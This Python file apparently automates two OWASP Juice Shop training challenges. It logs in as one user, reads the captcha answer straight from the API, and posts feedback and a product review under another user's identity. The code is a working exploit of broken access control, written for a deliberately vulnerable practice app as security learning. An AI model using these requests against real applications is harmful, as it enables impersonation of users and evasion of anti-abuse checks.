"""
This file is to automate the OWASP JUICESHOP TASK
FORGED FEEDBACK
FORGED REVIEW
The basic idea behind is to give a feedback/review in the name of other people
We will use user A's header and cookie to send post with username B
"""

from plugins import login as usrLogin
from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class forged(a.attack_inter):

    def __init__(self):
        self.juice_session = a.requests.session()
        usr = usrLogin.test_user_login_class()
        response, self.cookie, self.header = usr.run()
        self.userid = usr.id
        self.author = usr.email
        self.captchaId, self.captcha, self.captchaAns = self.load_captcha()
        if self.userid > 1:
            self.forgeId = 1 # you can also use any other user
        else:
            self.forgeId = None

    def generator(self):
        pass

    def load_captcha(self):
        print('-----------------------------------------')
        print('Let us get the captcha ------------------')
        url = a.URL + '/rest/captcha/'
        response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
        return response.json()["captchaId"], response.json()["captcha"], response.json()["answer"]

    def forged_feedback(self):
        print("------------------------------------------")
        print("Let us forge other's feedback ------------")
        url = a.URL + '/api/Feedbacks/'
        json_data = {
            'UserId': self.forgeId,
            'captchaId': self.captchaId,
            'captcha': self.captchaAns,
            'comment': 'I like orange Juice',
            'rating': 5,
        }
        response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)
        if response.status_code == 201:
            print("The original user has id")
            print(self.userid)
            print(response.json()["data"])
        print(response.status_code)

    def forged_review(self):
        print("------------------------------------------")
        print("Let us forge other's review --------------")
        url = a.URL + '/rest/products/1/reviews'
        json_data = {
            'message': 'I like orange Juice',
            'author': self.author,
        }
        response = self.juice_session.put(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)

    def run(self):
        self.forged_feedback()
        self.forged_review()






